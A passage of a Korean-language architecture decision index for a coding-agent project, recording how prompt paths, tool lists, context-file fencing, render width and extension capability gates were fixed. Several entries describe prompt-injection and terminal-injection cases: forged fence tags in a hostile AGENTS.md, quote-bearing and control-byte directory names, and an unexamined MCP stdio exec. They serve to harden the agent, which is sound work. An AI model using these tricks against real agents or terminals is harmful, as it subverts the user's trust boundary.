*안정성*만 보장하고 *정확성*은 수리가 담보 · 산문 자체는 검사 못 함 · ADR/specs는 계속 낡음 · **관례 자체(`file.py::symbol`로 갈지)는 미결정, #171에 기록**. 🔴 번호는 **0221→0223 두 번 이동**(동시 세션 충돌 사흘 새 두 번째). |
| 0220 | [The prompt's tool list is derived, its paths share one escape, and the user picks the write target](0220-the-prompts-tool-list-is-derived-and-its-paths-share-one-escape.md) | Accepted (2026-08-14 — 구현과 함께 착지) | #120 / #167 / #161 / #162. **핸드오프가 준 #120 옵션 (a)/(b)/(c)는 셋 다 pi 설계가 아니었다** — pi의 `buildSystemPrompt`는 이미 동적이다: `selectedTools`/`toolSnippets` 파라미터, 빈 집합이면 `(none)`, 그리고 열거를 비-망라로 만드는 한 문장 "In addition to the tools above, you may have access to other custom tools depending on the project." (`system-prompt.ts`, 2026-08-14 fetch). `agent-session.ts:928-943`(`setActiveToolsByName`)가 재빌드하고 `:2553`이 `_refreshToolRegistry`를 그 세터로 끝내므로 런타임 `registerTool`도 덮인다. `promptSnippet`/`promptGuidelines`는 **확장용 `ToolDefinition`**에 선언(`extensions/types.ts:449-459`). 즉 **aelix의 하드코딩 문장이 이탈**이었고 ADR-0216은 포팅을 가리킨다(오너 결정=전체 포팅). 옵션 (c)를 유혹한 측정은 사실이며 보존한다: 산문은 와이어 대비 **엄격히 중복이고 엄격히 덜 정확** — `read (read a file)` vs 어댑터가 매 요청 싣는 298자 `description`(내장 7개 = 요청당 5460바이트). 그래도 pi는 **더 짧은 다른 텍스트**를 유지하므로 삭제는 패리티 위반. **빌드된 것**: `Tool`에 `prompt_snippet`/`prompt_guidelines`(별도 정의 타입이 없어서 `Tool`에 — `register_tool`이 `Tool`을 직접 받음), 내장 7개는 pi 스니펫 **축자**, 옛 문장이 빠뜨렸던 `aelix_status`·`agent`도 스니펫 획득; `_resolve_system_prompt`의 `tools`는 **필수 키워드**(#115에서 `skills=` 누락이 조용히 `/agents use`를 망가뜨린 전례); 커널 `system_prompt_rebuilder` 콜백이 `_action_set_active_tools`·`_refresh_extension_tools`에서 호출(pi는 한 클래스라 공짜로 얻는 것을 aelix는 레지스트리가 커널에 있어 명시 호출). 콜백은 **완전한 프롬프트**를 반환하고(커널 재조인은 `/agents use`의 스킬·AGENTS.md를 조용히 되돌림) 스킬을 **provider로 늦게 읽으며**(pi `:1046` 동일 이유) 공유 `Args`를 클로저해 `--system-prompt`가 공짜로 존중됨. 실패는 debug 로그로 삼킴(콜백이 파일시스템을 만지고 호출자가 `register_tool`이라 `OSError`가 세션을 깨면 안 됨). `AgentProfileService.use`는 프롬프트를 **`set_active_tools` 뒤로** 옮김(전엔 곧 바뀔 툴셋으로 정체성을 만들었음). 가이드라인 중 `read`/`bash`를 호명하던 2개는 해당 툴로 이동(`--no-tools`에서도 "read files"라고 지시했었음), 수렴 블록 4개 중 3개는 툴 게이트. pi의 `edit` 불릿 4개는 **의도적 미포팅**(aelix `description`이 같은 3규칙을 이미 싣고 매 요청 과금 ~440자), pi `bash` 가이드라인도 미포팅(`PI_*`는 aelix에 없음 = 바로 그 오버클레임). **#167**: 5개 사이트가 두 규칙을 썼고 **둘 다 경로용으로 틀렸다** — 본문 이스케이프는 `&`→`&amp;`로 `/tmp/amp&test_…/r&d/src` 설치에서 **존재하지 않는 디렉터리**를 호명(실측 `is_dir()` False/True), `_package_pointer` 2개는 **raw**라 `<`가 무력화 안 됨(`a079188`이 cwd에 대해 닫은 채널이 설치 측에 열려 있었음). `_safe_prompt_path` 하나로 통일: C0/DEL/C1 제거 + `<`만 이스케이프, **`&`는 건드리지 않음**(태그엔 `<`가 필요하고 그것이 ADR-0217의 구조적 보장 전부; `&`는 POSIX 경로 합법이고 `git clone`이 재현). 가드는 호출부가 아니라 **`_package_pointer` 위**에 둬서 3번째 포인터가 빠질 수 없게 함. `<name>.py` 플레이스홀더는 이스케이프 **밖**에서 조립(의도된 산문). **#161**: 전역 타깃이 먼저 나열된 것은 프로젝트-로컬 티어가 **조용히 실패**하기 때문이라는 실측 이유였는데, 누가 고르는지 말하지 않으니 모델이 "먼저 나온 것"을 골랐다. 이제 **사용자에게 묻고**, 물을 사람이 없는 표면(`-p`/`--mode json`/`--mode rpc`/위임 자식)을 위한 폴백을 함께 실음(폴백=전역, 신뢰 프롬프트에 답할 사람도 없을 때 조용히 실패하지 않는 티어). 이건 **shape 1(프롬프트 전용)**이고 shape 2(`/extension new`)는 라이브 측정에 따른 에스컬레이션. **#162 = pi 패리티 유지(오너 결정), 코드 변경 0**: 베이스 프롬프트는 매 턴 **절대경로 6개**를 싣고 그중 `$HOME` 파생이 있어 **OS 계정명이 매 요청 프로바이더로 감**(실측). `~` 축약은 파일 툴 6개 전부에서 동작함을 실측했으나 채택하지 않음 — (1) pi는 어디에도 `~`가 없어 축약이 이탈, (2) **Windows**(오너 지적): `_resolve_shell_win32`가 pwsh→powershell→cmd.exe로 풀고 셋 다 외부 프로그램 인자의 `~`를 확장하지 않는데 프롬프트 경로 중 하나(api.py의 `grep -nE` 힌트)가 bash 소비다. 대신 `SECURITY.md`를 실제 방출면에 맞춤 — 전엔 working-directory 한 줄만 적고 **사용자명 노출을 아예 언급하지 않았음**; 이제 6개 전부·이유·완화책(`before_provider_payload`, `hooks.py:644`로 존재 확인)을 명시. **비용(정직하게)**: 내장 7개 기준 **4051 → 4615자 (+564, +13.9%)** 매 턴 과금, `--no-tools`는 **3547**(이전보다 작음), `--tools read`는 4015 — 비용이 세션이 실제로 가진 것에 비례한다는 게 리터럴이 못 하던 것. 신호탑 산문 예산 **1320 → 1600**(실측 1520), #161 절이 지불. 🔴 **커밋 후 5렌즈 적대적 리뷰가 37건 보고**(8건 검증 = 7 CONFIRMED/1 REFUTED), 그중 코드를 바꾼 것: ① **내 커밋 메시지가 거짓** — "두 rebuild를 각각 떨어뜨리면 RED"라고 썼는데 `entry.py` 등록후 rebuild는 지워도 프롬프트 테스트 105개 전부 green(테스트 헬퍼가 `_harness_factory`를 **재구현**해서 프로덕션 라인에 못 닿음 = 그 파일 docstring이 인용하는 함정). `apply_post_registration_tool_policy`로 추출해 테스트가 실제 라인을 호출하게 함. ② **0-툴 프롬프트 자기모순** — 오프너/가이드라인만 툴 연동하고 시그널포스트 2개는 무조건 방출해서 "you cannot read, write or run anything" 다음에 read할 디렉터리·write할 경로·`grep -nE`를 건넸음. 이제 문서블록=`read`, 확장블록=`write`, 소스포인터=`read`로 게이트(pi도 스킬 카탈로그를 `hasRead`로 게이트). ③ **`set_tools`가 rebuild 안 함** — docstring은 "모든 곳"이라 단언 중이었고, 이제 `harness/core.py`에 **AST 트립와이어**. ④ `prompt_snippet`이 무제한 멀티라인 채널(pi `_normalizePromptSnippet` 누락) — 복원 + 길이 캡, **순서가 load-bearing**(`_CONTROL_KILL`이 `\n`을 삭제해서 strip 먼저면 `"ok\n\nGuidelines:"`→`"okGuidelines:"`로 단어가 붙음). ⑤ 스킬 카탈로그 게이트가 플래그 기준 → `live_tool_names` 권위. ⑥ `tools=None` 기본값을 "fail-honest"라 적었는데 실은 **"툴 없음"이라는 적극적 거짓** → **필수 인자**. ⑦ `/agents use` 동치성 테스트가 **동어반복**이었음 → 진짜 `AgentProfileService.use` 구동. 수정 6건 전부 사보타주로 RED 확인. 🔴 **#161은 라이브 측정으로 shape 1 폐기 → shape 2 구현**: 프롬프트 준수는 **사용자 문구에 좌우**(출하문구 0/2, 강화문구 1/2 — "Do the work"면 무시). `/extension new <name>`(묻고·검증하고·실로더가 받는 스캐폴드 작성·덮어쓰기 거부·프로젝트로컬이면 조용한 스킵 경고·대화표면 없으면 **추측 대신 거부**). 다만 **프롬프트로 그 명령을 안내하는 것도 0/2 실패** — 가장 강한 문구까지. 부수 발견: 모든 write가 **권한 다이얼로그에서 멈춤** → "사용자가 못 본다"는 전제는 *선택*엔 맞고 *경로*엔 틀림; shape 3은 "이미 뜨는 다이얼로그에 세 번째 답 추가". **#101 라이브 조건은 이 프로브로 닫힘**(번들 가이드에서 capability 9개·enforced gate 3개 정확히 답함), **#161은 열어둠**. 🔴 **#161은 결국 shape 3까지 갔고, 이슈의 차단 전제가 반만 맞았다** — "권한 계층은 allow/deny뿐이라 '다른 데 써라'를 제안할 수 없다"는 **반환값**엔 맞고 **메커니즘**엔 틀림: `ToolCallHookEvent.args`가 루프가 `tool.execute`에 넘기는 **바로 그 dict**(`_before_tool_call_bridge`: "pass by reference — no defensive copy")라 훅에서 경로를 고쳐 쓰고 allow하면 파일이 옮겨진다. **커널 변경 0**, 이슈가 매긴 multi-day가 파일 3개+테스트 1개가 됨. 승인 다이얼로그가 4행이 됨(`1.[y] Yes — user global` / `2.[s] session` / `3.[p] Only this project` / `4.[n] No`), 행은 **No 위**(거절이 아니라 두 번째 승낙), 라벨은 **위치가 아니라 결과**(프로젝트 티어는 신뢰 없으면 조용히 실패), 리다이렉트는 **allow**이고 **세션 규칙 안 만듦**, 힌트 줄은 행에서 **유도**(첫 판이 4행 밑에 "1-3 / y·s·n"을 남겼음). 티어는 **정확히 둘**이고 확장 디렉터리 **아래** 중첩 경로조차 세 번째 행을 안 냄. **라이브 검증**: 모델이 전역을 고름 → 사용자가 `[p]` → 전역 디렉터리는 **생성조차 안 됨**, 프로젝트에 1221바이트 착지, 모델이 "(project-only, trusted location)"으로 정확히 보고. 사보타주 7/7 RED(커널 브리지를 방어적 복사로 바꾸는 것 포함 — 그게 이 설계를 조용히 죽이므로). **잔여**: 이 배치가 밀어낸 ~19개 인용 재유도 미완; 리뷰 LOW 몇 건 미반영. |
| 0218 | [The guides ship inside the wheel, the prompt names them, and the runtime answers for itself](0218-the-guides-ship-inside-the-wheel-and-the-runtime-answers-for-itself.md) | Accepted (2026-08-14 — 구현과 함께 착지) | #101. **한 결정, 다섯 조각, 세 가지 provenance** — 분리해 기록한다. ① **가이드를 배포물에 동봉 = FORWARD-PORT**(aelix가 한 번도 포팅하지 않은 pi 표면): pi `packages/coding-agent/package.json`의 `files: ["dist","docs","examples",…]`, 바이너리 빌드의 `shx cp -r docs dist/`. ② **시스템 프롬프트가 그 경로를 호명 = 같은 표면의 나머지 절반**: pi는 `src/core/system-prompt.ts:131-138`에서 `getReadmePath()`/`getDocsPath()`/`getExamplesPath()`(`src/config.ts:427/432/437`)를 7개 불릿으로 emit — **브리프의 `src/system-prompt.ts`는 404, 실제 경로는 `src/core/`**. aelix는 3개 불릿(632자, 프롬프트 3362→**3994**바이트 +19%, 매 턴 과금)이고 컷 3건 모두 근거 있음. ③ **`aelix docs` CLI = AELIX-ORIGINAL**: pi 서브커맨드는 `src/cli/args.ts:244-252`의 install/remove/uninstall/update/list/config/auth **7개뿐**, `docs` 없음. ④ **`RuntimeSnapshot` + `aelix_status` = AELIX-ORIGINAL**: pi 내장 툴은 `src/core/tools/index.ts:84` `allToolNames`가 read/bash/edit/write/grep/find/ls **7개** — 브리프가 말한 9개(edit-diff·image 포함)는 **틀림**(edit-diff는 `edit.ts`가 쓰는 diff 헬퍼, image 툴은 아예 없고 `read.ts:266`이 image 블록을 반환), 내성(introspection) 툴은 없음. ⑤ **`Extension.__repr__` 리댁션 = ADR-0206 패턴을 한 객체 더 밀어붙인 보안 수정**(pi엔 매니페스트 자체가 없어 parity/divergence 어느 쪽도 아님) — 실측 1250자 repr이 `env={'GITHUB_TOKEN': 'ghp_PLANTED_SECRET_abc123'}`으로 끝났고, ADR-0206은 **운반체**(`_ManifestEntry`)만 굳혀서 리댁션이 한 객체 앞에서 멈춰 있었음. **이슈 본문 정정 4건**: (a) 갭이 이슈 가정보다 **작았다** — base 휠(`a079188`)을 실제로 빌드해 zip을 읽으니 저작 산문이 이미 **30 419바이트**(SKILL.md ×2 + `examples/INDEX.md` + 레퍼런스 매니페스트 `echo/aelix-plugin.toml` 13 029B + starter README) 실려 있었음; 진짜 결함은 **`docs/guides/`가 휠에 없는데 휠 안 파일 5개가 6곳에서 그리로 링크**하고 있던 것(그중 `extension_install.py:2338`은 **체크아웃 없는 설치 사용자만이 읽는** 힌트) — 이번 브랜치 휠에서 6→**2**(둘 다 의도된 산문). (b) 이슈의 5개 토픽 중 **실제 콘텐츠 갭은 `project-trust` 하나뿐**; `tools`는 어댑터가 **매 요청마다** 툴 스키마를 params에 다시 싣기 때문에(`openai_responses.py:303`·`openai_completions.py:749`·`_google_shared.py:795`·`openai_codex_responses.py:254`) 이미 컨텍스트에 있음. `project-trust.md`는 루트 `SECURITY.md` 복사가 **아니라 새로 작성**(그 파일의 취약점 신고 연락처를 모든 휠에 실을 수 없음). (c) 이슈가 요구한 **신규 `aelix-help` 스킬은 만들지 않음** — 기존 `extending-aelix`가 이미 절차를 갖고 있었고 스킬 `description`은 **매 턴 과금**이라, 프론트매터를 바이트 단위로 그대로 두고 포인터만 접어 넣어 한계 프롬프트 비용 0. (d) `extension_paths`는 **의도적으로 드롭** — 실측상 `Extension.source_info`는 **writer가 0개**, `resolved_path`는 `loader.py:282` 한 분기에서만 세팅, 나머지 티어에서 경로 모양 값은 `Extension.name`이고 그건 **절대경로**(`/tmp/…/proj/.aelix/extensions/projext.py`) = 실기계에선 `$HOME`+OS 사용자명이 모델로 감; 대신 per-extension `scope` 라벨. `extension_api_version` → **`manifest_api_level`로 개명**(`ExtensionAPI`엔 버전이 없고, 버전 있는 유일한 확장 계약은 매니페스트 `[plugin.api]` ↔ `AELIX_API_LEVEL`=1). **밴드**: 밴드 룰은 이 패키지를 **결정하지 않음**(ADR-0208 — 유일한 질문은 "위임 정책인가"). `aelix_agents`가 아니라 별도 top-level `src/aelix_status`로 간 이유는 ADR-0197 표가 그 밴드를 "유일하게 스폰하는 밴드"로 정의하고 `tests/agents/test_p2_band_boundaries.py`가 그 아래 **모든 파일**을 위임 표면으로 취급하기 때문. 휠 포함은 **빌드된 휠을 여는 테스트**로만 검증(체크아웃은 이 결함을 볼 수 없음). **`project_trusted`는 fail-closed** — `ctx.is_project_trusted()`를 **쓰지 않음**(언바운드 기본값이 `lambda: True`, `extensions/api.py:1094` / `harness/core.py:265`이고 `rpc_ws.py:90`은 둘 다 없이 옵션을 만듦). **잔여(명시)**: `skills`엔 가이드가 없고 만들지도 않음(`aelix docs skills` = exit 2 + 포인터); `aelix status` CLI 어댑터 미구현; `--tools`/프로필 `tools:`는 `aelix_status`를 **활성 집합에서 뺄 수 있음**(실측 `--tools read,ls` → `["read","ls"]`); `Available tools:` 7개 문장(`cli/agent_context.py:689`)은 **이번 변경 전부터** `agent` 때문에 틀렸고 이제 둘 틀림 — **#120 소관, 여기서 건드리지 않음**. **미실측(명시)**: **실제 모델을 한 번도 돌리지 않았다** — 모든 수치는 실코드가 만든 프롬프트 텍스트·빌드된 휠의 zip 인덱스·실 CLI의 stdout/exit code·실 `tool.execute()`에서 나왔고 프로바이더 턴에서 나오지 않음. 따라서 모델이 실제로 가이드를 **읽는지**, 스코프 절이 평상 작업 중 문서 읽기를 **억제하는지**, 모델이 `aelix_status`를 **호출해 쓰는지**는 전부 미검증(#117의 대응 블록은 실모델 2/2로 정당화됐음). **리뷰 라운드 정정(15건, 같은 브랜치)**: near-miss가 `writing-skills`/레퍼런스 매니페스트를 **절대경로로** 지목하게 고침(L10); **sdist→wheel 왕복은 이미 테스트되고 있었음** — `uv build --package`가 sdist를 먼저 만들고 **그 sdist에서** 휠을 빌드함(L5); `/extension` 상수는 `_BUILTIN_ALWAYS_ON_NAMES`로 개명 + `StatusExtension` 추가(L3); `classify_scope`에 **entry-point 티어** 추가 — 그전엔 pip 설치 팩이 `explicit`로 보고됨(M1); 방출 문자열 **길이/제어문자 바운드** — `plugin.version` 패턴은 길이를 제한하지 않아 4138자가 그대로 나왔음(M2); entry.py 배선 트립와이어를 **값(AST) 비교**로 강화 — `project_trusted=lambda: True` fail-open이 통과했었음(M3); `docs/guides/` 하위디렉터리 가이드 **거부**(L1); `read`의 **줄 상한**도 단언(L2); `--offline` "no-op" 주석 정정(L6); 인용 6건 재도출(L4). **미해결 잔여**: 설치 경로 이스케이프는 **절반만 닫힘** — `_escape_text`가 `&`를 `&amp;`로 바꿔 `&` 포함 설치 경로에서 **존재하지 않는 경로**를 프롬프트에 싣고, `_extension_signpost`의 포인터 2개는 **이스케이프 없이** 방출됨(L9, 기존 결함, 후속). |
| 0219 | [Render width follows the terminal, under a readability ceiling the user can move](0219-render-width-follows-the-terminal-under-a-readability-ceiling.md) | Accepted (2026-08-14 — 구현과 함께 착지) | #166. **AELIX-ORIGINAL, 단 pi 인용 없음** — 이 워크스페이스의 pi 사본은 TUI 소스가 없는 부분 fetch라 pi의 렌더 폭 동작을 **읽지 않았고**, 따라서 parity/divergence 어느 쪽도 주장하지 않는다(ADR-0218이 막으려던 '기억한 provenance'). **80에는 결정 기록이 없었다** — 상수가 들어온 ADR-0105에 "width" **0회**; 이후 78(`_PICK_MAX_WIDTH`)·76(ADR-0112 "2-cell `│ ` gutter within an 80-col chrome")·72(ADR-0199 `BATCH_TASK_PREVIEW_CHARS`, "one visible row at 80 columns")가 전부 그 80에서 유도됨. **진짜 결함은 숫자가 아니라 층위** — 페인트 계층(스크롤백 `Console()`·ptk 크롬·`overlay._modal_cap`)은 처음부터 적응형이었고, 본문이 80칸으로 하드랩+**패딩**된 *뒤에* 터미널이 측정됐다. 실측: 200칸에서 사용자 에코 112·사고 161셀 vs 답변 79~80셀; 60칸에선 그 패딩이 콘텐츠로 재랩돼 54/26/56/24/60 고아 줄. **결정 7가지**: ① 단일 라이브 리더 `tui/width.py::terminal_columns` ② **`min(ptk, Rich)`** — Rich `Console.size`는 `$COLUMNS`가 ioctl을 **override**, ptk는 ioctl만; 실측 200칸+`COLUMNS=80`이면 기능이 79셀로 **조용히 원상복귀**. 선례는 `consent.py::_terminal_rows` finding F4("환경값은 측정을 더 작게만 만든다") ③ 리사이즈 추적은 **호출자 책임**, 화면에 남는 호출자는 **리더 자체**를 받음(`int | Callable[[], int]`) — 해석된 **숫자**를 넘기면 80칸 초과 터미널에서 **수정 전보다 나쁨**(패널이 이미 줄바꿈돼 잘림이 명령 **중간**을 베어내 *다른 명령처럼* 읽힘) ④ 가독성 천장 기본 120, `render_max_width`(60–240) = `min(터미널, 천장)`; **미설정 시 숫자를 저장하지 않음** → 120이 코드베이스에 한 곳 ⑤ **하한 없음** — 초안의 `[40,120]`이 30칸에서 **같은 잘림을 재현**(cols=30·36 프레임 미닫힘 실측) ⑥ **넘침 규칙은 표면마다 다름**: 승인 다이얼로그=ptk float `wrap_lines=False` → **CLIP**(초과 금지) / 툴 카드=적응형 콘솔의 bare `Text` → **WRAP**(초과 무해) ⇒ 카드 캡은 76에서 **넓어지기만** 한다(양방향 유도가 60칸에서 63셀 줄을 `...T…`로 잘라 **main이 보여주던 출력을 삭제**했음) ⑦ **SIGWINCH 핸들러 없음** — ptk가 이미 소유. **귀결**: 커밋된 스크롤백은 **절대 리플로우 불가**(`full_screen=False`, 그 바이트는 호스트 터미널 것) — 리사이즈는 이후 출력만 고침, 우회 대신 **명시**; 리사이즈는 **다음 메시지부터** 적용(`_new_stream()`이 원래도 메시지마다 호출 = 재측정 지점이 이미 존재했고 불변 필드를 다시 읽고 있었음); 헤더 캡의 `len()`(코드포인트) vs `_truncate_lines`의 **셀** 불일치를 여기서 통일(한글 요약이 80코드포인트 검사를 최대 160셀로 통과 — 동적 폭 위에 두면 터미널 크기마다 더 어긋남). **스위트는 이 부류를 관측할 수 없었다** — venv에서 `isatty()`=False이고 `get_terminal_size()`가 파이썬 기본값 **80**(시험 대상 숫자)을 반환, PTY를 여는 테스트 0개 ⇒ `tests/tui/_pyte.py`에 실제 `run_tui`를 구동하는 `render_shell_to_screen` 추가, 결함을 **`xfail(strict=True)`로 먼저 고정**해 수정이 조용히 착지하지 못하게 함. **반려안**: 80 유지(측정된 실패 2건이 사용자 가시) · 천장 없는 raw 폭(울트라와이드에서 고치려는 버그보다 나쁨) · 천장 기본값을 설정에 저장(120 두 벌) · 상수 공개 + `_PRODUCT_CORE_CAP_ALLOWLIST` 수정(공개 `MAX_`/`MIN_`은 ADR-0197 위임-cap으로 읽힘; 렌더 기하는 위임 정책이 아니므로 **정책 표면으로 제시하지 않는 것**이 정직) · SIGWINCH 핸들러. **범위 밖(명시)**: `context.py`/`descriptors.py`는 확장 컴포넌트용 `_RENDER_WIDTH = 80` 유지(ADR-0182 표면); 크롬 푸터는 **반대 모양의 결함** — `wrap_lines` 없이 Window를 만들어 좁은 터미널에서 모델·컨텍스트 게이지·git 브랜치를 말줄임표도 없이 **조용히 떨어뜨림**(별도 이슈감). |
| 0217 | [Project context files follow pi's published policy, and forward-sync to pi's fence](0217-project-context-files-follow-pis-published-policy-and-forward-sync-to-its-fence.md) | Accepted (2026-08-13 — 구현과 함께 착지) — **ADR-0216의 "pi 자신의 동작은 매 업스트림 싱크를 견딜 이유 없이는 뒤집지 않는다" 기준을 이 표면에 적용**; `args.Args.project_trust_override` docstring의 "#121은 미결 정책" 문장 폐기 | #121. **한 결정, 다섯 조각, 네 가지 provenance** — 뭉뚱그리면 두 싱크 뒤에 divergence가 parity로 오독되므로 분리해 기록. ① **주입은 trust-independent 유지 = PARITY**: pi `packages/coding-agent/docs/security.md:27`("context files ... are loaded regardless of project trust")·`:37`("prompt injection from ... context files ... is expected local-agent risk and cannot be reliably prevented by pi"); pi는 반대 방향을 **실제로 해보고 4일 만에 되돌림** — `89a9220`(2026-06-05, v0.79.0)이 `trust-manager.ts`에 `CONTEXT_FILE_NAMES` 추가, `5cb4f59`(2026-06-09, v0.79.1)가 **같은 줄 삭제**(태그 귀속은 compare API로 실측: 각각 v0.78.1/v0.79.0보다 ahead, v0.79.0/v0.79.1보다 behind). ② **`<project_context>` fence = FORWARD-SYNC**, 그리고 **커밋 2개를 반드시 함께 인용** — `e2fd651e`(2026-05-17, `customPrompt` 브랜치, v0.75.0)·`7577d3b8`(2026-05-18, **기본** 브랜치, v0.75.4); `e2fd651e` 하나만 들면 기본 경로 근거가 **틀림**(패치 실측: 각각 `:~59`/`:~153` 훅). ③ **청크 순서 = FORWARD-SYNC**: pi는 append→context→skills(양 브랜치 일치), aelix는 `[context, *user_appends, catalog]`였음 — 미신뢰 저장소의 `AGENTS.md`가 **사용자가 직접 친 `--append-system-prompt`보다 앞서던** 실제 결함. ④ **XML 이스케이프(본문 + `path` 속성) = 유일한 선언적 AELIX-ORIGINAL DIVERGENCE**, 논거는 "pi보다 안전"이 **아니라** "지킬 수 없는 provenance 라벨을 달지 않는다": 적대적 `AGENTS.md` 1개로 3자 실측 — 변경 전 aelix(fence 없음) `<project_context>` **0 open / 1 close**, **pi 자신의 emission을 그대로 옮긴 것** `<project_context>` **1 open / 2 close**·`<project_instructions` **1/2**(= 페이로드가 경계 **밖**으로 읽힘), 이번 브랜치 **1/1·1/1**·`<available_skills>` **0**. pi는 세 변형 전부에 취약하고 세 번째는 본문이 아니라 **`path` 속성** — 디렉터리 이름의 `"`는 OS가 허용(`mkdir 'sub">x'` 성공, 그 아래 `AGENTS.md` 발견됨)하고 pi는 raw 보간, aelix는 `path="…/sub&quot;&gt;x/AGENTS.md"`. `skills_prompt._escape_xml` **재사용(재유도 금지 — 치환 순서가 load-bearing, `"`/`'` 이미 커버)**; **이스케이프가 예산보다 먼저**(`&`→`&amp;`로 최대 ~5배 증가 ⇒ raw 예산은 상한 미집행); **절단은 이스케이프된 본문에만 도달**(태그 바이트를 본문과 분리 과금 ⇒ 닫는 태그 2개는 항상 온전 — 조립 문자열을 잘랐다면 **적대 파일 없이 aelix가 스스로** 불균형 fence를 만들었을 것). ⑤ **32 KiB 캡 = 기존부터 있던 AELIX-ORIGINAL을 여기서 선언**(도입 아님) — **pi엔 캡이 아예 없음**; 이제 fence(실측 85 바이트)+태그+이스케이프 본문까지 **반환 문자열 전체**를 bound. **이슈 본문 정정 2건**: (a) "headless/AUTO_ACCEPT에서 사용자 확인 없이"는 틀림 — **어떤 모드도 묻지 않음**(interactive 포함); interactive만 사후 **공지** 1줄(`[Context]` 행)을 갖는데 그 행조차 `-nc`에서 `AGENTS.md`라고 **거짓 보고**하고 있었음 (b) 이전 `# Project context ({path})` 마크다운 헤더는 **pi 형식과 원래 일치한 적이 없음**(pi의 fence 이전 형식은 `# Project Context` + `## {path}`) ⇒ parity 회귀 아님. **부수 수정**: `/context`가 project context를 `System prompt`와 `Memory files`에 **이중 과금**하고 `-nc`에서 **유령 행**을 만들었으며, 배너 `cwd:` 행이 경로를 **raw로 렌더**(Rich는 BEL만 떨어뜨리고 ESC는 통과 ⇒ 미종료 OSC) — 전자는 `tui/project_context.py`의 **containment 분할**로, 후자는 `sanitize_for_terminal`로. **잔여(명시)**: 이스케이프는 **구조적 위조만** 닫음 — 적대적 `AGENTS.md`는 설계상 여전히 임의 지시 채널이고 **산문으로 그냥 부탁할 수 있음**. **미실측(명시)**: 실제 모델이 위조된 카탈로그/경계에 **반응하는지**는 측정하지 않음 — 모든 수치는 실코드 경로가 만든 **프롬프트 텍스트**에서 나왔고 프로바이더 턴에서 나오지 않음. **동시 수정**: `--no-context-files`가 이제 위임된 하위 에이전트까지 **전파됨** — 종전엔 `aelix_agents` 패키지 전체에 `no_context_files`가 0회였고 측정한 12개 스폰 조합 전부 `-nc=False`였음(사용자가 명시적으로 켠 플래그가 위임 순간 무력화). 배선은 **캡처한 bool이 아니라 lambda여야** 함(`/agents use`가 같은 `Args` **객체**를 제자리에서 고쳐 써서 양방향으로 stale) 이고 극성 뒤집기는 체인 전체에 **정확히 1회**; AST 트립와이어가 호출부를 고정(문자열 검색은 discovery 게이트의 동명 인자에 걸려 **구멍을 닫힌 것으로 오보**). **부수 2건 더**: 적대적 디렉터리 이름이 터미널을 조종할 수 있었음 — `discover_context_files`의 예산 경고 2개가 절대경로를 보간하는데 이 경로는 TUI가 생기기 **전** `cli/entry.py`에서 출력되므로 `-p`/`--mode json`/`--mode rpc`에도 발사(실측 `['0x7','0x1b']` = 미종료 OSC). 이제 C0/DEL/C1을 출력 전 삭제하며, `path=` 속성에도 적용 — XML 이스케이프는 제어바이트를 건드리지 않고 XML 1.0 `Char`는 C0를 금지하므로 raw `\x1b`는 방금 주장하기 시작한 fence를 **공격자가 고르는 속성에서** malformed로 만듦. |
| 0206 | [A declared `contributes.*` family is refused BEFORE the pack's code is imported](0206-declarative-gates-refuse-before-the-import.md) | Accepted (2026-07-31 — `878004b`; 설계 기록은 사후 작성) — **ADR-0102 §"Trust gate" 정정**(게이트의 1차 위치가 `_invoke_factory`가 아님) | **AELIX-ORIGINAL**. 같은 종류의 판단인 두 게이트가 **서로 다른 단계**에 있었다: `tui_widgets`/`ui_tui_trusted`는 임포트 **전**(ADR-0182), `hooks`/`shell_exec`는 임포트와 `setup()` **후**(ADR-0102) — 실측 `ep_widget.imported? False` / `ep_hook.imported? True`. 즉 거부는 진짜였으나 **순서가 아니었고**, 게이트가 아니라 감사 로그였다. **결정**: 옮기지 말고 **호이스트** — `_enforce_declarative_capability_gates(manifest)` 하나를 `_resolve_factory`(임포트 전)와 `_invoke_factory`(팩토리 전) **두 곳**에서 호출. 함수가 하나라 **다음 `contributes.*` 패밀리가 잘못된 단계에 배선될 수 없다**(이 결함의 원인 자체를 제거). 부수 수정: `_ManifestEntry` 기본 repr이 `mcp_servers[].env` **API 토큰을 stderr로 유출**(실측 1261자에 `ghp_…` → 191자·무비밀). **정직한 한계**: 이것은 선언 데이터에 대한 **로드타임 검사이지 샌드박스가 아니다** — `Capabilities`는 non-frozen pydantic이라 `setup()`이 자체 부여하면 **세 겹 fence를 전부 통과**(실측). 초판 주석은 반대로 주장했고 리뷰가 잡았다. **미결**: `ext_widgets.py`가 `setup()` 이후 위젯을 재독하며 재검사 안 함 · `cli/entry.py`가 `loaded.errors`를 버려 **거부된 팩이 미설치처럼 보임**. #91(ADR-0204)은 이 헬퍼를 상속하며 게이트 코드를 **추가하지 않는다**. |
| 0205 | [Manifest capabilities are ENFORCED for three flags — and `contributes.mcp_servers` is one of them](0205-manifest-capability-gates-are-enforced.md) | Accepted (2026-08-01 — 구현과 함께 착지) — **ADR-0096 §"Capabilities declaration vs enforcement"·ADR-0094 §T4 표/§Trust model·ADR-0101 §Deferred 정정** | **AELIX-ORIGINAL** (pi에는 매니페스트·capability 어휘·core MCP 클라이언트가 전무). `[[contributes.mcp_servers]]`가 **게이트 없는 마지막 실행 패밀리**였음 — `cli/entry.py`가 발견된 모든 매니페스트의 서버를 `McpClientManager`에 그대로 넘겼고 `transport="stdio"`는 `command`+`args`를 `{**os.environ, **env}`로 exec. 악용하는 팩은 **가장 감사하기 쉬워 보이는 매니페스트**(`[capabilities]` 테이블 없음 + `[plugin.entry] python` 없음 = 읽을 파이썬이 0줄)이고, 유일한 흔적이 `MCP server failed: Connection closed` — **성공한 실행이 실패한 연결로 보고**됨. **D1 게이트는 이름이 아니라 실제로 행사되는 원시 동작을 따름**: stdio → `shell_exec`(= `[[contributes.hooks]]`와 **동일 원시 동작이므로 동일 플래그**, ADR-0102), http/sse → `net`(자식 프로세스 0, 아웃바운드 연결). 서로 잠금해제 금지. **D2 `mcp_serve` 아님** — 이름이 가장 그럴듯하고 **ADR-0094:86-87이 저자를 실제로 그리로 안내**했으나, 스키마가 승부를 가름: `mcp_serve`는 `validate_entry_python_required_for_python_capabilities`를 통해 **`[plugin.entry] python`을 강제**함(호스트가 그 서버를 돌리려면 플러그인 파이썬을 로드해야 하므로) = "플러그인이 서버**이다**". `[[contributes.mcp_servers]]`는 정반대 방향(순수 config, 코드 불필요) ⇒ `mcp_serve`로 게이트하면 config-only 팩이 **임포트 가능한 코드를 발명하도록 강제**되어 **보안 퇴행**. `mcp_invoke`는 플러그인→호스트 방향(ADR-0101이 연기한 